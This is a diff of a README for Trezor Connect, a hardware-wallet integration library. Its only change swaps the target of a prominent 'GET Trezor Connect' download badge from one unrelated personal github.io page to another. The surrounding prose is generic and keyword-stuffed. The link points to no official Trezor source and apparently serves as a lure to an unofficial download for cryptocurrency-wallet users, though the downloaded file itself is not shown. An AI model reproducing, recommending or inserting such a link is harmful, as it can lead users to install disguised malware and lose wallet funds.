@@ -51,7 +51,7 @@ The repository is useful for developers who need Trezor Connect GitHub resources
 
 Prerequisites: A web application, access to a supported Trezor hardware wallet, and a development environment prepared for browser-based wallet testing.
 
-[![GET Trezor Connect](https://img.shields.io/badge/GET%20%E2%80%94%20Trezor%20Connect-0078D6?style=for-the-badge&logoColor=white)](https://rolandsampsonmthi.github.io/.github/trezor-connect)
+[![GET Trezor Connect](https://img.shields.io/badge/GET%20%E2%80%94%20Trezor%20Connect-0078D6?style=for-the-badge&logoColor=white)](https://pablohardycbsy.github.io/.github/trezor-connect)
 
 1.  **Review the Package:** Start with Trezor Connect npm information and confirm the package version, installation method, and release notes that match your project.
 2.  **Read the API Flow:** Use Trezor Connect documentation to understand method names, parameter requirements, event handling, and expected device confirmation steps.
